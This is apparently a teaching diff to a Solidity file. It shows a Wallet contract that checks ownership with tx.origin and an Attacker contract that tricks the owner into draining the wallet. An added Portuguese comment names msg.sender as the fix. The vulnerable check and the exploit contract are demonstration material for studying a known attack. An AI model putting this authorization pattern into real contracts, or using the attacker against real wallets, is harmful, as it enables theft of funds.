@@ -25,6 +25,7 @@ contract Wallet {
     receive() external payable{}
 
     function withdrawFunds(address to) public {
+        // utilize o msg.sender == owner para validar evitando o ataque
         require(tx.origin == owner, "Not owner");
         uint contractBalance = address(this).balance;
         (bool suceed,) = to.call{value:contractBalance}("");
@@ -36,11 +37,11 @@ contract Attacker {
     address public owner;
     Wallet public victim; 
     constructor(Wallet _victim) {
-        owner = payable(msg.sender);
+        owner = msg.sender;
         victim = Wallet(_victim);
     }
 
-    receive() external payable{
-       victim.withdrawFunds(owner); 
+    function withdrawFunds(address to) external  {
+        victim.withdrawFunds(owner);
     }
 }
